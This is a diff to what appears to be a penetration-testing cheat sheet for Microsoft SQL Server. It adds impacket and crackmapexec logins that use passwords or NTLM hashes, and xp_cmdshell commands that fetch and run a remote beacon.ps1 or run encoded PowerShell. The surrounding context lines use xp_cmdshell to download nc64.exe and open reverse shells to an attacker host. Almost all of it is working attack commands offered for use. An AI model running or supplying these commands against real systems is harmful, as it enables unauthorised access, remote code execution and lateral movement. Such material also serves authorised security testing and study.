@@ -61,6 +61,11 @@ runas /netonly /user:SQL\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
 
 ### From Linux
 ```
+/usr/bin/impacket-mssqlclient  Samson:<Password>@10.10.10.199
+/usr/bin/impacket-mssqlclient  -windows-auth 'Samson'@10.10.10.199 -hashes :<NTLM>
+crackmapexec mssql 10.10.10.199 -u WEB01$ -H <>-q 'SELECT name FROM master.dbo.sysdatabases;'
+
+
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' #Check Impersonation.
 enum_impersonate #Check Impersonation.
 exec_as_login sa
@@ -73,4 +78,6 @@ xp_cmdshell “powershell -c cd C:\Users\Public; wget http://{host_ip_address}:1
 xp_cmdshell “powershell -c cd C:\Users\Public; .\nc64.exe -e cmd.exe {host_ip_address}:4444”
 xp_cmdshell powershell -c "wget -usebasicparsing http://10.8.1.176:8888/nc64.exe -o C:\Temp\nc64.exe"
 xp_cmdshell powershell -c "C:\Temp\nc64.exe -e cmd 10.8.1.176 443"
+EXEC xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring('http://192.168.199.100/beacon.ps1')"
+EXEC xp_cmdshell powershell -ExecutionPolicy Bypass -enc "bm90ZXBhZC5leGU="
 ```
